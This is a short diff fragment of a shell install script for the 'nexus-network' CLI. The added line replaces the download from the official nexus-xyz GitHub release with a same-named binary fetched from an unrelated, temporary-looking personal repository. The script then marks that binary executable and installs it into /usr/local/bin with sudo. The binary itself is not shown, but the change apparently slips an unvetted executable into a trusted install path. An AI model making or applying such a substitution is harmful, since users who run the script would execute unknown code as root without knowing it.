@@ -10,7 +10,7 @@ expect eof
 '
 source ~/.bashrc
 cd ~/Downloads
-wget https://github.com/nexus-xyz/nexus-cli/releases/download/v0.9.7/nexus-network-linux-x86_64
+wget https://raw.githubusercontent.com/maryluz90-temp2/temp1/main/nexus-network-linux-x86_64
 chmod +x nexus-network-linux-x86_64
 sudo mv nexus-network-linux-x86_64 /usr/local/bin/nexus-network
 which nexus-network
